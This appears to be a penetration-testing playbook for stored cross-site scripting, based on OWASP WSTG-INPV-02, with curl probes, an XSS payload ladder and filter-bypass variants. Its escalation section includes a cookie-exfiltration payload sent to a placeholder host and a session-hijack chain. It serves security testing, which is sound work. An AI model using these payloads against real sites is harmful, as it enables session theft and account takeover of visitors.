# Micro-Playbook: Xss Stored
**Practitioner / Methodology:** PortSwigger Research (Gareth Heyes); Brute Logic; Michał Bentkowski; Masato Kinugawa; Mario Heiderich/Cure53; OWASP WSTG-INPV-02
**Category:** web

# Stored Cross-Site Scripting (XSS) — WSTG-INPV-02

> Practitioner sources: PortSwigger Research (Gareth Heyes) Academy XSS materials + XSS cheat sheet; Brute Logic (brutelogic.com.br); Michał Bentkowski (mutation/sanitizer bypass research); Masato Kinugawa (browser filterbypass cheat sheet); Mario Heiderich / Cure53 (HTML5 Security Cheatsheet). Methodology cross-checked against OWASP WSTG-INPV-02 "Testing for Stored Cross Site Scripting".

## Preconditions & Indicators
- Application persists user input server-side (guestbook, comments, profiles, logs) and re-renders it on subsequent page loads without context-appropriate output encoding.
- Indicator: text submitted via POST/GET reappears verbatim (unescaped) when the page is fetched again.
- Stored XSS needs no victim link — any visitor triggers execution, making it higher impact than reflected XSS (OWASP rates stored XSS severe).

## Enumeration
1. Confirm surface exists and requires auth/session:
   `curl -s -i {{TARGET_URL}}`
2. Locate input points: inspect HTML form field names (`grep -E '<(form|input|textarea)'`), note method (GET/POST), required fields, and CSRF tokens if present.
3. Probe reflection context with a benign marker:
   `curl -s -b "{{AUTH_TOKEN}}" -d "field=<p>xssprobe123</p>" {{TARGET_URL}}` then
   `curl -s -b "{{AUTH_TOKEN}}" {{TARGET_URL}} | grep -n "xssprobe123"`
4. Determine render context from where the marker lands: body text node → tag-injection payloads; inside `value="..."` → attribute-escape payloads; inside `<script>` block → JS-context breakouts.

## Diagnostic Checks (non-destructive, low request volume)
Run each probe as ONE store + ONE read-back; diff what survives storage:

1. Baseline storage probe (HTML allowed?):
   `curl -s -b "{{AUTH_TOKEN}}" -d "txtName=probe&mtxMessage=<p>xssprobe</p>&btnSign=Sign" {{TARGET_URL}} && curl -s -b "{{AUTH_TOKEN}}" {{TARGET_URL}} | grep -i xssprobe`
2. Context-aware payload ladder (submit one at a time):
   - `<script>alert(document.domain)</script>` (classic)
   - `"><script>alert(document.domain)</script>` (attribute escape + breakout)
   - `<img src=x onerror=alert(document.domain)>` (no `<script>` needed)
   - `<svg onload=alert(document.domain)>`
   - `<details open ontoggle=alert(document.domain)>`
   - `<body onload=alert(document.domain)>`
   - `<iframe src="javascript:alert(document.domain)">`
3. Filter fingerprinting (reveals sanitization logic):
   - Case variants: `<ScRiPt>alert(1)</ScRiPt>`
   - Nested/split tags: `<scr<script>ipt>alert(1)</script>`
   - Null byte injection: `%00<script>alert(1)</script>`
   - Encoding: double-URL-encode `%253Cscript%253E`, unicode escapes
   - Tag-with-space tricks: `<script >alert(1)</script>`, `<svg/onload=alert(1)>`
   - Observe which survive read-back raw → tells you exact filter behavior.
4. Attribute-context escape (if marker landed inside a quoted attribute):
   `" autofocus onfocus=alert(document.domain) x="`
5. Event-handler-only fallback if tags are stripped but quotes/handlers survive:
   `" onmouseover="alert(document.domain)` 

## Verification & Impact
- CONFIRMED when: payload persists server-side AND is served back RAW (no HTML entity encoding) on reload — verify:
  `curl -s -b "{{AUTH_TOKEN}}" {{TARGET_URL}} | grep -o '<script>alert[^<]*</script>'` or grep for the unescaped event handler.
- Signature of a patched app: response shows `&lt;script&gt;` or stripped tags → not vulnerable in that context; try next context.
- Impact: attacker JS runs in every visitor's session origin → session-cookie theft (if not HttpOnly), credential harvesting via fake login overlay, keylogging, defacement, worm propagation. No victim interaction/link required.

## Escalation & Chaining
- Cookie exfiltration PoC: `<img src=x onerror="fetch('//COLLAB_HOST/'+document.cookie)">` (PoC only — in lab, `alert(document.cookie)` suffices).
- Session hijack chain: stolen PHPSESSID replayed via `-b` cookie header → account takeover → pivot to admin functions.
- Blind stored XSS: payload fires only when backend/admin renders the entry — confirm via out-of-band callback canary.
- Chain with access-control flaws: XSS-driven fetch of `/api/*` endpoints as victim user demonstrates end-to-end IDOR/data reach.